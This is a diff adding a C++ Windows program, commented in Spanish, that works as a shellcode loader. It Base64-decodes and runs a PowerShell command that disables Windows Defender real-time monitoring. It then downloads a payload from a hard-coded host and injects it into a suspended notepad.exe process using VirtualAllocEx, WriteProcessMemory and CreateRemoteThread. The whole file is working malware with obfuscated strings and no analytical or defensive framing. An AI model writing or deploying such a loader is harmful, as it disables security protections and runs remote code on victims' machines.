@@ -1,0 +1,150 @@
+#include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+#include <string>
+#include <algorithm>
+#include <wincrypt.h>
+
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "crypt32.lib")
+
+// Función para decodificar una cadena Base64
+std::string Base64Decode(const std::string& encoded) {
+    DWORD decodedSize = 0;
+    CryptStringToBinaryA(encoded.c_str(), encoded.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
+    std::vector<BYTE> decodedBuffer(decodedSize);
+    CryptStringToBinaryA(encoded.c_str(), encoded.length(), CRYPT_STRING_BASE64, decodedBuffer.data(), &decodedSize, NULL, NULL);
+    return std::string(decodedBuffer.begin(), decodedBuffer.end());
+}
+
+// Función para desactivar Windows Defender
+void DisableDefender() {
+    // Comando de PowerShell codificado en Base64
+    std::string psScriptBase64 = "cG93ZXJzaGVsbCAtQ29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSI=";
+
+    // Decodificar el comando de PowerShell
+    std::string psScript = Base64Decode(psScriptBase64);
+
+    // Ejecutar el comando
+    system(psScript.c_str());
+}
+
+// Función para descargar un archivo binario desde un servidor y almacenarlo en un buffer en memoria
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
+    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return {};
+
+    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    std::vector<BYTE> buffer;
+    DWORD dwSize = 0, dwDownloaded = 0;
+    do {
+        WinHttpQueryDataAvailable(hRequest, &dwSize);
+        if (dwSize > 0) {
+            std::vector<BYTE> tempBuffer(dwSize);
+            WinHttpReadData(hRequest, tempBuffer.data(), dwSize, &dwDownloaded);
+            buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
+        }
+    } while (dwSize > 0);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+
+int main() {
+
+    DisableDefender();
+
+    // Rutas codificadas en Base64
+    std::string notepadPathBase64 = "QzpcV2luZG93c1xTeXN0ZW0zMlxub3RlcGFkLmV4ZQ==";
+    std::string testBinPathBase64 = "L3Rlc3QuYmlu";
+
+    // Decodificar las rutas
+    std::wstring notepadPath = std::wstring(Base64Decode(notepadPathBase64).begin(), Base64Decode(notepadPathBase64).end());
+    std::wstring testBinPath = std::wstring(Base64Decode(testBinPathBase64).begin(), Base64Decode(testBinPathBase64).end());
+
+    // Descarga el shellcode desde el servidor
+    std::vector<BYTE> shellcode = Download(L"192.168.2.138", testBinPath.c_str());
+    if (shellcode.empty()) {
+        std::cerr << "Error al descargar el archivo binario.\n";
+        return 1;
+    }
+
+    // Inyección en un proceso nuevo (por ejemplo, notepad.exe)
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    PROCESS_INFORMATION pi = { 0 };
+
+    if (!CreateProcess(notepadPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        std::cerr << "Error al crear el proceso.\n";
+        return 1;
+    }
+
+    // Asignar memoria en el proceso remoto
+    LPVOID pRemoteBuffer = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pRemoteBuffer) {
+        std::cerr << "Error al asignar memoria en el proceso remoto.\n";
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return 1;
+    }
+
+    // Escribir el shellcode en el proceso remoto
+    SIZE_T bytesWritten = 0;
+    if (!WriteProcessMemory(pi.hProcess, pRemoteBuffer, shellcode.data(), shellcode.size(), &bytesWritten)) {
+        std::cerr << "Error al escribir en la memoria del proceso remoto.\n";
+        VirtualFreeEx(pi.hProcess, pRemoteBuffer, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return 1;
+    }
+
+    // Crear un hilo remoto que apunte al shellcode
+    HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
+    if (!hRemoteThread) {
+        std::cerr << "Error al crear el hilo remoto.\n";
+        VirtualFreeEx(pi.hProcess, pRemoteBuffer, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return 1;
+    }
+
+    // Reanudar el proceso para ejecutar el shellcode
+    ResumeThread(pi.hThread);
+
+    // Esperar a que termine el hilo
+    WaitForSingleObject(hRemoteThread, INFINITE);
+
+    // Limpiar recursos
+    CloseHandle(hRemoteThread);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    std::cout << "Inyección completada con éxito.\n";
+
+    return 0;
+}
